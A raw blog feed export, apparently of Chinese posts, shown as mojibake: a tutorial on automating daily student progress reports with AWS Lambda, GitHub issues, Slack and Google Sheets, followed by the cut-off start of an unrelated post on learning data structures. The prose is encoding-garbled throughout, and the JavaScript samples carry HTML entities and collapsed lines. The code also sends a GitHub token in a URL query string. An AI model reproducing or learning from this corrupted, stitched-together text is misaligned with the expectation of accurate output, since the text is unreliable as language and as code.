é€™æ¨£å­çš„å¥½è™•å°±æ˜¯ç´€éŒ„å¯ä»¥æ°¸ä¹…ä¿å­˜ï¼Œè€Œä¸”é‚„å¯ä»¥åˆ†å¤©ï¼å¯ä»¥å¾ˆå®¹æ˜“çš„å°±æ‰¾åˆ°æŸä¸€å¤©æ‰€æœ‰äººçš„é€²åº¦å ±å‘Šï¼Œé€™å€‹æ˜¯ç›´æ¥ po åœ¨ Slack è£¡æ²’è¾¦æ³•åšåˆ°çš„ã€‚
å…ˆçµ¦å¤§å®¶çœ‹ä¸€ä¸‹æˆå“ï¼Œæˆå“é•·å¾—æœƒåƒé€™æ¨£ï¼š

æœ‰äº†å°æ•´å€‹ç°½åˆ°ç³»çµ±çš„æ¦‚å¿µä»¥å¾Œï¼Œæ¥ä¸‹ä¾†æˆ‘å€‘å¯ä»¥æŠŠåœ¨æŠ€è¡“ä¸Šè¦åšçš„äº‹æƒ…åˆ†æˆä»¥ä¸‹ä¸‰é …ï¼š

æ¯å¤©è¦åœ¨ GitHub é–‹ä¸€å€‹ Issueï¼Œæ¨™é¡Œæ˜¯ä»Šå¤©çš„æ—¥æœŸ
æ¯å€‹ Issue ä¸‹çš„ç•™è¨€è¦è¢«åŒæ­¥åˆ° Slack
è¦ä¸²æ¥ GitHub Webhookï¼ŒåŒæ­¥æŠŠç´€éŒ„å¯«åˆ°è©¦ç®—è¡¨è£¡é¢

å†ä¾†å°±æ˜¯å¯¦ä½œæ™‚é–“äº†ï¼
1. æ¯å¤©è¦åœ¨ GitHub é–‹ä¸€å€‹ Issueï¼Œæ¨™é¡Œæ˜¯ä»Šå¤©çš„æ—¥æœŸä¸€çœ‹åˆ°ã€Œæ¯å¤©ã€é€™å€‹é—œéµå­—ï¼Œå°±çŸ¥é“é€™æ˜¯ Cron Job å¯ä»¥æå®šçš„äº‹æƒ…ï¼ŒåŸæœ¬æˆ‘æƒ³åœ¨è‡ªå·±çš„æ©Ÿå™¨ä¸Šå¯«å€‹ç°¡å–®çš„å°ç¨‹å¼è®“å®ƒæ¯å¤©è·‘ï¼Œå¯æ˜¯æˆ‘è…¦æµ·ä¸­çªç„¶å†’å‡ºä¸€å€‹é—œéµå­—ï¼šAWS Lambdaã€‚
å¦‚æœä½ é‚„ä¸çŸ¥é“é€™æ˜¯ä»€éº¼ï¼Œæˆ‘ç°¡å–®èªªä¸€ä¸‹ï¼Œé€™æ˜¯è¿‘å¹´å¾ˆæµè¡Œçš„ Serverless çš„æ¦‚å¿µä¹‹ä¸€ï¼Œä¸æ˜¯èªªæ²’æœ‰ Serverï¼Œè€Œæ˜¯æŒ‡èªªä½ ä¸ç”¨è‡ªå·±å»ç®¡ Serverï¼Œä½ å”¯ä¸€è¦åšçš„å°±æ˜¯æŠŠä½ çš„ application å¯«å¥½ï¼Œå‰©ä¸‹é‚£äº›è·Ÿ Server è·Ÿæ©Ÿå™¨æœ‰é—œçš„äº‹æƒ…ä½ éƒ½ä¸ç”¨ç®¡ã€‚
è€Œ AWS Lambda å°±æ˜¯é€™æ¨£çš„ä¸€å€‹æœå‹™ï¼Œä½ åªè¦æŠŠä½ çš„ç¨‹å¼ç¢¼æ”¾ä¸Šå»å°±å¥½äº†ï¼Œå‰©ä¸‹çš„ä½ éƒ½ä¸ç”¨ç®¡ï¼Œè¨ˆè²»æ–¹å¼æ˜¯ç¨‹å¼çš„åŸ·è¡Œæ™‚é–“ï¼Œå¯èƒ½æ˜¯å› ç‚ºé‚„åœ¨æ¨å»£æœŸçš„é—œä¿‚ï¼Œæ‰€ä»¥ä¸€å€‹æœˆåœ¨ä¸€å®šæ™‚æ•¸ä»¥å…§éƒ½ä¸ç”¨éŒ¢ã€‚
å¦‚æœä¸ç”¨ Lambdaï¼Œæˆ‘è¦è‡ªå·±æŠŠæ±è¥¿å‚³åˆ°æˆ‘çš„ Serverï¼Œç„¶å¾Œè‡ªå·±è¨­å®š Cron Job ä¾†è·‘ï¼Œå¦‚æœä¸»æ©Ÿå‡ºäº†ä»€éº¼äº‹æƒ…é‚„è¦è‡ªå·±ä¾†ä¿®ï¼Œå¯æ˜¯æˆ‘æƒ³åšçš„å°±åªæ˜¯é€™éº¼ç°¡å–®çš„ä¸€ä»¶äº‹æƒ…è€Œå·²é˜¿ï¼ç”¨ Lambda å¯ä»¥å¹«æˆ‘çœæ‰å¾ˆå¤šéº»ç…©ï¼Œçµ•å°æ˜¯æœ€ä½³é¸æ“‡ã€‚
ç¢ºå®šè¦æ”¾åœ¨ Lambda ä¸Šä¹‹å¾Œï¼Œå°±æ˜¯è¦æŒ‰ç…§å®ƒçš„è¦æ±‚æŠŠç¨‹å¼ç¢¼å¯«å¥½æ”¾ä¸Šå»ï¼Œå…¶å¯¦é€™è¦æ±‚ä¹Ÿå¾ˆç°¡å–®å•¦ï¼Œå°±æ˜¯æŠŠä½ è¦åŸ·è¡Œçš„ function ç”¨ exports.handler çµ¦ export å‡ºå»å°±å¥½ã€‚
ä¸‹é¢æ˜¯å¯«å¥½çš„ç¨‹å¼ç¢¼ï¼š
var axios = require(&#x27;axios&#x27;)var moment = require(&#x27;moment&#x27;)  var token = process.env.tokenvar endpoint = &#x27;https://api.github.com/repos/Lidemy/mentor-daily-report/issues?access_token=&#x27; + tokenvar today = moment().format(&#x27;YYYY-MM-DD&#x27;)  var content = [  &#x27;åœ¨ä¸‹é¢è«‹æŒ‰ç…§æ­¤æ ¼å¼æä¾›æœ¬æ—¥é€²åº¦å ±å‘Šï¼š&#x27;,  &#x27;```&#x27;,  &#x27;## æ˜¨å¤©&#x27;,  &#x27;- å¯«ä½œæ¥­ hw2-1&#x27;,  &#x27;- ç·´ç¿’ JavaScript è¿´åœˆä½¿ç”¨&#x27;,  &#x27;## ä»Šå¤©&#x27;,  &#x27;- ç ”ç©¶ä»€éº¼æ˜¯ callback&#x27;,  &#x27;- å¯«ä½œæ¥­ hw2-1ï¼ˆç¹¼çºŒï¼‰&#x27;,  &#x27;```&#x27;].join(&#x27;\n&#x27;)  const createIssue = async (event) =&gt; &#123;  try &#123;    const result = await axios.post(endpoint, &#123;      title: &#x27;[é€²åº¦å ±å‘Š] &#x27; + today,      body: content    &#125;, &#123;      headers: &#123;        &#x27;Accept&#x27;: &#x27;application/vnd.github.v3+json&#x27;      &#125;    &#125;)    return &#x27;success&#x27;  &#125; catch (err) &#123;    return err;  &#125;&#125;  exports.handler = createIssue  

ä¸€å€‹éå¸¸ç°¡å–®çš„ç¨‹å¼ï¼Œä¸€åŸ·è¡Œå°±æœƒé€é GitHub API å» po ä¸€å€‹æ–°çš„ Issueï¼Œæ¨™é¡Œå°±æ˜¯ä»Šå¤©çš„æ—¥æœŸã€‚
æœ‰ä¸€é»éœ€è¦æ³¨æ„çš„æ˜¯é€™é‚Šæœ‰ç”¨åˆ°å…¶ä»– npm çš„ libraryï¼Œæ‡‰è©²æœ‰æ–¹æ³•æ˜¯å¯ä»¥åªå‚³ package.json ä¸Šå»ï¼ŒLambda å°±å¹«ä½ åŸ·è¡Œ npm install æŠŠé‚£äº›å¥—ä»¶æŠ“ä¸‹ä¾†ï¼Œä½†æˆ‘æ‡¶å¾—æŸ¥äº†ï¼Œæˆ‘å°±ç›´æ¥æŠŠnode_modulesåŒ…é€²å£“ç¸®æª”è£¡é¢ä¸Ÿä¸Šå»ã€‚
æˆ‘ä¸Šä¸€æ¬¡ç”¨ Lambda å¤§æ¦‚å…©ä¸‰å¹´å‰ï¼Œé€™å€‹æœå‹™æ‰å‰›æ¨å‡ºæ²’å¤šä¹…ï¼Œå› ç‚ºå¥½å¥‡æ‰€ä»¥éš¨æ„ç©äº†ä¸€ä¸‹ï¼Œç™¼ç¾ä»‹é¢å¾ˆé™½æ˜¥ç„¶å¾Œå¾ˆå¤šæ±è¥¿ä¸çŸ¥é“æ€éº¼è¨­å®šã€‚
äº‹éš”å¤šå¹´ï¼Œé€™æ¬¡å†çœ‹åˆ°å®ƒçš„ä»‹é¢çœŸçš„åš‡åˆ°æˆ‘äº†ï¼Œé€²æ­¥è¶…ç´šå¤šï¼
é¦–å…ˆæ˜¯è§¸ç™¼æ¢ä»¶é€™å€‹éƒ¨åˆ†ä¸€ç›®ç­ç„¶ï¼š

å› ç‚ºæˆ‘æ˜¯è¦æ¯å¤©å›ºå®šåŸ·è¡Œï¼Œåœ¨ AWS ä¸Šä½ å¯ä»¥ç”¨ CloudWatch ä¾†è¨­å®šä¸€å€‹æ’ç¨‹ï¼Œè¦æ³¨æ„çš„æ˜¯åœ¨ Lambda ä¸Šé¢é€™å€‹æ’ç¨‹çš„æ™‚é–“æœƒä»¥ UTC ç‚ºæº–ï¼Œä¹Ÿå°±æ˜¯ +0 çš„æ™‚å€ï¼Œæ‰€ä»¥ä½ å¦‚æœæ˜¯å¯«èªªæ¯å¤© 00:00 è·‘ï¼Œå…¶å¯¦å°±ä»£è¡¨èªªæ˜¯åœ¨å°ç£çš„æ—©ä¸Š 08:00 è·‘ã€‚
æˆ‘é€™é‚Šè¨­å®šçš„è¡¨é”å¼æ˜¯ï¼š5 0 ? * MON-FRI *ï¼Œåœ¨å°ç£æ™‚é–“å¹³æ—¥æ—©ä¸Š 08:05 éƒ½æœƒè§¸ç™¼ Lambdaï¼ŒåŸ·è¡Œ po issue çš„ functionã€‚
ç„¶å¾Œåœ¨ Lambda çš„ä»‹é¢ä¸Šå¦‚æœä½ çš„ç¨‹å¼ç¢¼æ²’æœ‰å¾ˆå¤§ï¼Œå¯ä»¥ç›´æ¥ç·¨è¼¯ï¼Œæœ‰åŠŸèƒ½å®Œæ•´çš„ç·¨è¼¯å™¨ï¼ˆæˆ‘ä¸€ç›´è¦ºå¾—å¾ˆçœ¼ç†Ÿï¼Œå¾Œä¾†æ‰æƒ³åˆ°æ‡‰è©²æ˜¯ Amazon è²·äº† Cloud9 çš„é—œä¿‚ï¼Œä»¥å‰ä¸Š CS50 éƒ½ç”¨ Cloud9 çš„ IDEï¼Œé›£æ€ªé€™éº¼ç†Ÿæ‚‰ï¼‰ï¼š

æœ€å¾ŒæŠŠç’°å¢ƒè®Šæ•¸ token è¨­å®šå¥½ä¹‹å¾Œå°±å®Œæˆäº†ï¼Œæ¸¬è©¦ä¸€ä¸‹ç™¼ç¾ Issue æœ‰æˆåŠŸè¢«å»ºç«‹ï¼Œç¬¬ä¸€å€‹ä»»å‹™å°±é€™æ¨£è¼•é¬†å®Œæˆäº†ï¼Œæ„Ÿè¬ Lambda çš„åŠªåŠ›ã€‚
2. æ¯å€‹ Issue ä¸‹çš„ç•™è¨€è¦è¢«åŒæ­¥åˆ° Slacké€™æ˜¯ä¸‰å€‹ä»»å‹™ç•¶ä¸­æœ€ç°¡å–®çš„ï¼Œå› ç‚º Slack æœ¬ä¾†çš„å„ªå‹¢å°±æ˜¯å¯ä»¥è·Ÿå¾ˆå¤šç¾æˆçš„æ±è¥¿ä¸²æ¥ï¼Œåªè¦åœ¨ Slack ä¸Šé¢å®‰è£ GitHub Appï¼Œå°±å¯ä»¥ç”¨æŒ‡ä»¤ä¾† subscribe æŒ‡å®šçš„ repo è·Ÿäº‹ä»¶ã€‚
å› ç‚ºé€™å€‹å¯¦åœ¨æ˜¯å¤ªç°¡å–®ï¼Œæ‰€ä»¥æˆ‘å°±æ²’å¿…è¦å†å¤šä»‹ç´¹äº†ï¼Œç›´æ¥çµ¦å¤§å®¶çœ‹æˆæœï¼š

3. è¦ä¸²æ¥ GitHub Webhookï¼ŒåŒæ­¥æŠŠç´€éŒ„å¯«åˆ°è©¦ç®—è¡¨è£¡é¢é€™å€‹ä»»å‹™æˆ‘å€‘ä¸€æ¨£ç”¨ Lambda æ­é…å…¶ä»– AWS çš„æœå‹™å°±å¯ä»¥è¼•é¬†å¯¦ä½œå‡ºä¾†ï¼Œæµç¨‹æ˜¯é€™æ¨£çš„ï¼š

å­¸ç”Ÿç•™è¨€ï¼Œè§¸ç™¼ GitHub Webhook
GitHub Webhook æ‰“åˆ° AWS API Gateway
ç¶“ç”± API Gateway è§¸ç™¼ Labmda function
Lambda function é€é Google Sheet API å¯«å…¥è©¦ç®—è¡¨

æˆ‘å€‘å…ˆä¾†æŠŠè¦ä¸Ÿçµ¦ webhook çš„ API çµ¦æº–å‚™å¥½ï¼Œé€™é‚Šåˆ©ç”¨ API Gateway ä¾†è§¸ç™¼ Lambdaï¼Œåƒæ˜¯é€™æ¨£ï¼š

API Gateway è¨­å®šä¸Šä¹Ÿè¶…ç´šæ–¹ä¾¿ï¼Œä½ å°±è¨­å®šè¦ç”¨ä»€éº¼ HTTP methodï¼Œä»–å°±æœƒçµ¦ä½ ä¸€å€‹ç¶²å€ï¼Œå‡è¨­æˆ‘è¨­å®šçš„æ˜¯ GETï¼Œé‚£ä½ ç”¨ GET æ‰“é€™å€‹ API å®ƒå°±æœƒè§¸ç™¼ Lambdaï¼Œç”¨è¶…çŸ­çš„æ™‚é–“å°±èƒ½åšå‡ºä¸€å€‹ Webhookï¼Œæ¯”èµ·è‡ªå·±æ¶ Server é‚„è¦è¨­å®š domain è·Ÿ https æ–¹ä¾¿å¾—å¤šã€‚
å†ä¾†å°±æ˜¯è¦ä¸²æ¥ Google Sheet API äº†ï¼Œæˆ‘ç¨å¾®çœ‹äº†ä¸€ä¸‹å®˜æ–¹çš„ API ç™¼ç¾é‚„æ˜¯ç¶­æŒä¸€æ…£çš„é¢¨æ ¼ï¼Œå°±æ˜¯æ–‡ä»¶å¾ˆå®Œæ•´ä½†æ˜¯è¬›å¾—å¾ˆè¤‡é›œï¼Œæ²’è¾¦æ³•ä¸€çœ¼å°±çœ‹å‡ºæˆ‘åˆ°åº•è¦æ€éº¼å¯¦ä½œå‡ºæˆ‘è¦çš„åŠŸèƒ½ï¼Œå¾Œä¾†å°±æ‰¾äº†ä¸€å¥—åˆ¥äººåŒ…è£éçš„ï¼šSimple Google Spreadsheet Access (node.js)ï¼Œç”¨èµ·ä¾†ç°¡å–®å¾ˆå¤šã€‚
æœ€éº»ç…©çš„æ¬Šé™ç®¡ç†è£¡é¢ä¹Ÿæœ‰æ•™ä½ æ€éº¼å¯¦ä½œï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯å»é–‹ä¸€å€‹Service Accountï¼Œè¨­å®šæˆå° Google Drive API æœ‰æ¬Šé™ï¼Œç„¶å¾Œå†å»ç”¢ç”Ÿé€™å€‹å¸³è™Ÿçš„ tokenï¼Œç”¨é‚£ä¸€çµ„ token å°±è¡Œäº†ã€‚
ä¸»ç¨‹å¼è¦åšçš„åŸºæœ¬ä¸Šå°±æ˜¯å…ˆéæ¿¾è³‡æ–™ï¼Œæ¥è‘—å¾ GitHub ä¸Ÿéä¾†çš„è³‡æ–™è£¡æ‰¾åˆ°å¸³è™Ÿï¼ŒæŠŠå¸³è™Ÿè·Ÿæ—¥æœŸä¸Ÿé€²æˆ‘å¦å¤–å¯«å¥½çš„ functionï¼Œæœ€å¾Œå›å‚³çµæœå°±çµæŸäº†ï¼š
var updateSheet = require(&#x27;./lib&#x27;)  exports.handler = async (event, context, callback) =&gt; &#123;    if (!event.body) return &#x27;no body&#x27;    const body = JSON.parse(event.body) || &#123;&#125;    if (!body || body.action !== &#x27;created&#x27;) return response(callback)    const title = body.issue.title.split(&#x27; &#x27;)    if (!title.length) return response(callback)    const date = title[1]    const account = body.comment.user.login    console.log(&#x27;log:&#x27;, date, account)    try &#123;        await updateSheet(date, account)        return callback(null, &#123;            statusCode: 200,            body: date + account        &#125;)    &#125; catch (err) &#123;        console.log(&#x27;error:&#x27;, err)    &#125;          return response(callback)&#125;;  const response = (cb) =&gt; &#123;    cb(null, &#123;        statusCode: 200,        body: &#x27;ok&#x27;    &#125;)&#125;

updateSheet é€™å€‹ function åšçš„äº‹ä¹Ÿå¾ˆç°¡å–®ï¼Œå°±æ˜¯æ ¹æ“šæ—¥æœŸé‚„æœ‰å¸³è™Ÿæ‰¾åˆ°æ­£ç¢ºçš„ä½ç½®ï¼ŒæŠŠé‚£ä¸€æ ¼çš„å€¼æ›´æ”¹æˆ O å°±å¥½äº†ï¼Œé€™é‚Šé™„ä¸Šéƒ¨åˆ†ç¨‹å¼ç¢¼ä¾›å¤§å®¶åƒè€ƒï¼š
async function searchAccount(sheet, account) &#123;  const firstRow = await getCells(sheet, &#123;    &#x27;min-row&#x27;: 1,    &#x27;max-row&#x27;: 1  &#125;)  const length = firstRow.length  for(var i=0; i&lt;length; i++) &#123;    if (firstRow[i].value === account) &#123;      return &#123;        col: firstRow[i].col,        batchId: firstRow[i].batchId      &#125;    &#125;  &#125;  return null&#125;  async function setValue(sheet, row, col, value) &#123;  const cells = await getCells(sheet, &#123;    &#x27;min-row&#x27;: row,    &#x27;max-row&#x27;: row,    &#x27;min-col&#x27;: col,    &#x27;max-col&#x27;: col,    &#x27;return-empty&#x27;: true  &#125;)  if (cells &amp;&amp; cells[0]) &#123;    cells[0].value = value    cells[0].save(function(err) &#123;      if (err) &#123;        console.log(&#x27;err&#x27;, err)      &#125;    &#125;)  &#125;&#125;  async function updateSheet(date, account) &#123;  try &#123;    const sheet = await getSheet()    const accountPosition = await searchAccount(sheet, account)    const datePosition = await searchDate(sheet, date)    console.log(&#x27;position:&#x27;, accountPosition, datePosition)    if (!accountPosition || !datePosition) return    await setValue(sheet, datePosition.row, accountPosition.col, &#x27;O&#x27;)  &#125; catch (err) &#123;    console.log(&#x27;err&#x27;, err)  &#125;  &#125;

æœ€å¾Œåªè¦åœ¨ GitHub é‚£é‚ŠæŠŠ webhook çš„ç¶²å€è¨­å®šå¥½ï¼Œä¸€åˆ‡å°±å¤§åŠŸå‘Šæˆäº†ï¼
åœ¨ Lambda ä¸Šè¦å¦‚ä½• debugï¼Ÿé›–ç„¶æˆ‘ä¸Šé¢å¯«çš„è¼•é¬†å¯«æ„ï¼Œä½†å¯¦éš›é–‹ç™¼çš„æ™‚å€™æˆ‘å…¶å¯¦æœ‰ç¢°åˆ°å¹¾å€‹å°å•é¡Œï¼Œç¬¬ä¸€å€‹å°±æ˜¯ debug ä¸åƒä½ åœ¨é›»è…¦ä¸Šé‚£æ¨£å¯ä»¥ç›´æ¥çœ‹åˆ°çµæœï¼Œè€Œä¸” webhook é€šå¸¸åˆæ˜¯æ¯”è¼ƒé›£ debug çš„ä¸€å€‹ã€‚
æœ‰é—œæ–¼é€™éƒ¨åˆ†ï¼Œå…¶å¯¦ Lambda éƒ½æœƒæŠŠ log é€åˆ° CloudWatch å»ï¼Œæ‰€ä»¥å°±æ˜¯è‡ªå·±åœ¨ app è£¡é¢å¯« logï¼Œå†å»çœ‹ CloudWatch åˆ†æä¸€ä¸‹é‚£äº› logï¼Œå¦‚æœæ˜¯ç°¡å–®çš„æ‡‰ç”¨çš„è©±é‚„æ»¿å®¹æ˜“çš„ï¼Œå†è¤‡é›œä¸€é»çš„è©±æ‡‰è©²å°±æ˜¯ function è¦åˆ‡æ›´ç´°ï¼Œä¸ç„¶ debug èµ·ä¾†æ‡‰è©²æ»¿éº»ç…©çš„ã€‚
å¦ä¸€å€‹ç¢°åˆ°çš„å•é¡Œæ˜¯ Google Sheet API é‚£é‚Šé€Ÿåº¦æ¯”è¼ƒæ…¢ï¼Œæ•´å€‹éç¨‹åšå®Œå¤§æ¦‚è¦ 5 ç§’å·¦å³ï¼Œé è¨­çš„ timeout å¥½åƒæ˜¯ 3 ç§’å·¦å³ï¼Œè¨˜å¾—è¦è‡ªå·±æŠŠ timeout åŠ å¤§ä¸ç„¶æœƒä¸€ç›´å¤±æ•—ã€‚
ç¸½çµé€™æ¬¡å°æ–¼ AWS Lambda çš„ä½¿ç”¨é«”é©—æ»¿ä¸éŒ¯çš„ï¼Œé–‹ç™¼éç¨‹ä¸­æ²’ç¢°åˆ°ä»€éº¼å¤ªå¤§çš„å›°é›£ï¼Œå¯èƒ½è·Ÿæˆ‘æƒ³å¯¦ä½œçš„æ±è¥¿æ¯”è¼ƒç°¡å–®ä¹Ÿæœ‰é—œä¿‚ï¼Œä½†é€™ç¨®ç°¡å–®çš„æ±è¥¿æˆ‘è¦ºå¾—è¶…ç´šé©åˆèµ°é€™ç¨® Serverless çš„æ–¹æ¡ˆï¼Œå› ç‚ºæ²’æœ‰ Server çœŸçš„è¶…æ–¹ä¾¿çš„ï¼Œå°‘äº†å¾ˆå¤šéº»ç…©ã€‚
ä»¥å¾Œå¦‚æœé‚„æœ‰é¡ä¼¼ç°¡å–®çš„å°éœ€æ±‚ï¼Œæˆ‘æƒ³æˆ‘æ‡‰è©²é‚„æ˜¯æœƒèµ°é€™ç¨®è§£æ±ºæ–¹æ¡ˆï¼Œç›´æ¥ç”¨ç¾æˆæœå‹™ä¸€å€‹ä¸²ä¸€å€‹ï¼ŒæŠŠæ±è¥¿å…¨éƒ¨ä¸²èµ·ä¾†å°±çµæŸäº†ã€‚ä¹Ÿæ¨è–¦å¤§å®¶å¦‚æœè¦åšä¸€äº›å°æ±è¥¿ï¼Œä¸å¦¨ä¾†è©¦è©¦çœ‹ç”¨é€™äº›ç¾æˆçš„æœå‹™æå®šï¼Œå¯ä»¥ç¯€çœå¾ˆå¤šæ™‚é–“ã€‚
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>lambda</tag>
        <tag>aws</tag>
      </tags>
  </entry>
  <entry>
    <title>å¦‚ä½•å……æ»¿ç†±æƒ…åœ°å­¸ç¿’ - ä»¥è³‡æ–™çµæ§‹ç‚ºä¾‹</title>
    <url>/2018/09/02/learn-with-passion/</url>
    <content><![CDATA[å‰è¨€æœ€è¿‘ä¸ç®¡æ˜¯å·¥ä½œã€é‚„æ˜¯è‡ªå·±é¡å¤–çš„å­¸ç¿’ï¼Œéƒ½æ„Ÿå—åˆ°æ“æœ‰ç†±æƒ…æ˜¯å¾ˆé‡è¦çš„ï¼Œæœ‰ç†±æƒ…ï¼Œæ‰æ›´æƒ³æŠ•å…¥å¿ƒåŠ›ï¼ŒæŠŠæŠ€èƒ½ç£¨ç·´åˆ°é ‚å°–ï¼Œä¹Ÿåœ¨éç¨‹ä¸­ç²å¾—æ›´å¤šæ¨‚è¶£ï¼
æœ€è¿‘å¤§å®¶éƒ½å–Šè‘—è¦å­¸ç¨‹å¼è¨­è¨ˆï¼Œå› ç‚ºæœ‰è¶…ç´šçˆ†ç‚¸å¤šçš„æœªä¾†æ‡‰ç”¨ï¼Œä¾‹å¦‚è™›æ“¬å¯¦å¢ƒã€æ“´å¢å¯¦å¢ƒã€äººå·¥æ™ºæ…§ã€æ©Ÿå™¨äººã€å€å¡ŠéŠç­‰ç­‰æ±è¥¿éƒ½éœ€è¦å¤§é‡çš„ç¨‹å¼è¨­è¨ˆå¸«ã€‚
ä½†æ˜¯ï¼Œè¦æŠŠç¨‹å¼å¯«å¥½ï¼Œè‰¯å¥½çš„è³‡æ–™çµæ§‹èˆ‡æ¼”ç®—æ³•åŸºç¤æ˜¯ä¸å¯å°‘ï¼Œç¶²è·¯ä¸Šä¹Ÿå·²ç¶“æœ‰å¥½å¤šå¥½å¤šçš„å­¸ç¿’è³‡æºäº†ã€‚å¯æ˜¯ï¼Œåœ¨é€éé€™äº›è³‡æºå­¸ç¿’çš„æ™‚å€™ï¼Œå¸¸å¸¸æ„Ÿå—åˆ°çš„éƒ½æ˜¯ã€Œé¡Œç›®å¥½é›£ã€ã€ã€Œå¥½å¤šæ±è¥¿è¦å­¸ã€â€¦ç­‰ç­‰ï¼Œæ‰€ä»¥ä»Šå¤©æƒ³è¦èŠ±ä¸€äº›æ™‚é–“ä¾†æ¢è¨æ¢è¨ï¼Œåˆ°åº•è©²æ€éº¼åšï¼Œæ‰èƒ½æœ‰ç†±æƒ…åœ°ä¾†å­¸ç¿’ï¼Œä¸¦ç”¨è³‡æ–™çµæ§‹ä¾†èˆ‰ä¾‹ã€‚
äº†è§£æ„ç¾©åƒ¹å€¼ï¼ŒçŸ¥é“è‡ªå·±çš„å­¸ç¿’å…·æœ‰æ„ç¾©é¦–å…ˆï¼Œæˆ‘ä¾†è¬›ä¸€å€‹å‰æï¼Œé€™å€‹å‰æå°±æ˜¯ï¼š
å¦‚æœæˆ‘å€‘èªçœŸåœ°å»è§€å¯Ÿæ¯ä¸€ä»¶äº‹æƒ…ï¼Œå¹¾ä¹éƒ½å¯ä»¥çœ‹åˆ°é€™ä»¶äº‹æƒ…å­˜åœ¨æˆ–ç™¼ç”Ÿçš„æ„ç¾©ã€‚

æˆ‘å€‘ä¾†çœ‹è³‡æ–™çµæ§‹ï¼Œå°±å¯ä»¥çœ‹åˆ°é€™äº›è³‡æ–™çµæ§‹éƒ½è¢«é‹ç”¨åœ¨å¾ˆå¤šåœ°æ–¹ã€‚
ä¾‹å¦‚ï¼Œå¤§å®¶æœ€ä¸€é–‹å§‹å­¸åˆ°çš„ Arrayï¼Œå¯ä»¥ç”¨ä¾†å„²å­˜åŒé¡å‹çš„æ±è¥¿ã€ä½ ä¸éœ€è¦ç‚º array ä¸­æ¯ä¸€å€‹å…ƒç´ éƒ½é‡æ–°å®£å‘Šä¸€å€‹è®Šæ•¸ï¼Œå…‰æ˜¯ array å­˜åœ¨çš„æœ¬èº«å°±çœä¸‹å¤§å®¶å¯« code å¤§é‡çš„æ™‚é–“ã€‚
å†ä¾†ï¼Œæœ€è¿‘å¾ˆå¤¯çš„ Deep Learningï¼Œè£¡é¢æœ‰å¤§é‡çš„é¡ç¥ç¶“ç¶²è·¯æ¬Šé‡ï¼Œé€™äº›æ¬Šé‡ä¹Ÿéƒ½æ˜¯ç”¨çŸ©é™£ï¼ˆå¯¦éš›ä¸Šå°±åªæ˜¯æ›´å¤šç¶­åº¦çš„ arrayï¼‰ä¾†å„²å­˜ã€‚
ç”šè‡³ï¼Œä½ è¦å„²å­˜ä¸€å€‹æ›´è¤‡é›œçš„è³‡æ–™çµæ§‹ - graphï¼Œä½ ä¹Ÿå¯ä»¥ç”¨ 2D array ä¾†å„²å­˜ node ä¹‹é–“çš„é—œä¿‚ã€‚
æ¯å¤©ç”Ÿæ´»ä¸­æˆ‘å€‘æœƒçœ‹åˆ°çš„å½±åƒï¼Œåœ¨æ“ä½œæ™‚ä¹Ÿä¸éå°±æ˜¯å­˜æœ‰ä¸€å †æ•¸å€¼çš„ 2D arrayã€‚
é€™éº¼ä¸€å€‹çœ‹èµ·ä¾†å¾ˆç°¡å–®ã€å¾ˆ trivial çš„è³‡æ–™çµæ§‹ï¼Œå¦‚æœä½ ç¨å¾®æƒ³ä¸€æƒ³ï¼Œå°±æœƒæ„Ÿå—åˆ°ä½ çš„ç”Ÿæ´»ä¸­æœ‰è¨±å¤šæ±è¥¿ï¼ŒèƒŒå¾Œå¯èƒ½éƒ½ä½¿ç”¨åˆ° arrayï¼Œæˆ–è·Ÿ array æœ‰ç•°æ›²åŒå·¥ä¹‹å¦™ï¼ˆä¾‹å¦‚ä½ çš„æ›¸æ¶å°±åƒæ˜¯ arrayï¼Œä¸Šé¢çš„æ›¸å°±åƒæ˜¯è£¡é¢çš„å…ƒç´ ï¼‰ã€‚
é€™äº›è³‡æ–™çµæ§‹éƒ½æ˜¯å¾ˆæœ‰æ„ç¾©çš„ï¼Œä»–å€‘ä¸¦ä¸åªæ˜¯å†·å†°å†°çš„çŸ¥è­˜ï¼Œè€Œæ˜¯æœ‰å¯¦éš›ç”¨é€”æ‰è¢«ç™¼æ˜å‡ºä¾†çš„æ±è¥¿ï¼Œè€Œç•¶æˆ‘å€‘äº†è§£ä»–å€‘çš„ç”¨é€”ï¼Œå°±æ…¢æ…¢å¯ä»¥äº†è§£ç‚ºä½•æˆ‘å€‘éœ€è¦å­¸ç¿’å„ç¨®è³‡æ–™çµæ§‹çš„å„ç¨®æ“ä½œçš„æ™‚é–“è¤‡é›œåº¦ï¼Œå› ç‚ºé€™äº›çŸ¥è­˜å¯ä»¥å¹«åŠ©ä½ å°‡é€™äº›å¥½æ±è¥¿ç”¨åˆ°æ¥µè‡´ï¼
å¯æ˜¯ï¼Œé›–ç„¶æˆ‘å€‘å¯èƒ½å¯ä»¥æ„Ÿå—åˆ°å­¸çš„æ±è¥¿æœ‰æ„ç¾©ï¼Œä½†å­¸ç¿’éç¨‹ä¸­å»æœƒé‡åˆ°æŒ«æŠ˜ï¼Œæ‰€ä»¥æ¥ä¸‹ä¾†æƒ³è¦è·Ÿå¤§å®¶åˆ†äº«å¿«æ¨‚å­¸ç¿’çš„ä¸€å€‹æ–¹æ³•~
å–„ç”¨ä½ çš„è…¦è¢‹ï¼Œè®“å­¸ç¿’æ›´å¿«æ¨‚æœ€è¿‘å› ç·£éš›æœƒï¼Œå­¸ç¿’åˆ°é—œæ–¼æˆ‘å€‘å¤§è…¦çš„ä¸€äº›çŸ¥è­˜ï¼Œé€™äº›çŸ¥è­˜å°æ–¼ä¿æœ‰å­¸ç¿’ç†±å¿±ä¹Ÿæœ‰å¾ˆå¤§çš„å¹«åŠ©ï¼Œä¹Ÿæœƒè®“ä½ åœ¨é¢å°æŒ«æŠ˜æ™‚æ›´å®¹æ˜“è·³è„«å‡ºä¾†ã€‚
å¾ å¤§è…¦æ„ˆé–‹å¿ƒï¼Œå­¸å¾—æ„ˆå¥½ï¼é«˜æ•ˆå­¸ç¿’ 6 å€‹ç¥•å¯† ï¼Œå¯ä»¥çœ‹åˆ°ä¸€å€‹é‡è¦çš„è³‡è¨Šï¼š
